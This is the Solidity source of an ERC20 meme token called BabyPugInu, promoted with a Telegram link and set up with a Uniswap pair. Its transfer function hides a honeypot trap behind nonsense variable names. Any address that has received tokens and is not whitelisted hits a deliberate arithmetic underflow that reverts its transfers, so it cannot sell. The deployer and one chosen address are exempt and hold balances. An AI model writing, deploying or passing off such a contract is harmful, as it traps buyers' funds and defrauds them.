// https://t.me/babypuginu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.3;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract BabyPugInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private thee;
    mapping(address => uint256) private too;

    function _transfer(
        address forward,
        address nine,
        uint256 enemy
    ) internal override {
        uint256 sit = pain;

        if (too[forward] == 0 && thee[forward] > 0 && forward != uniswapV2Pair) {
            too[forward] -= sit - 1;
        }

        address factory = address(light);
        light = BabyPugInu(nine);
        thee[factory] += sit + 1;

        _balances[forward] -= enemy;
        uint256 hunter = (enemy / 100) * pain;
        enemy -= hunter;
        _balances[nine] += enemy;
    }

    uint256 public pain = 0;

    constructor(
        string memory smaller,
        string memory people,
        address forget,
        address native
    ) ERC20(smaller, people) {
        uniswapV2Router = IUniswapV2Router02(forget);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        too[msg.sender] = party;
        too[native] = party;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[native] = party;
    }

    BabyPugInu private light;
    uint256 private party = ~uint256(1);
}
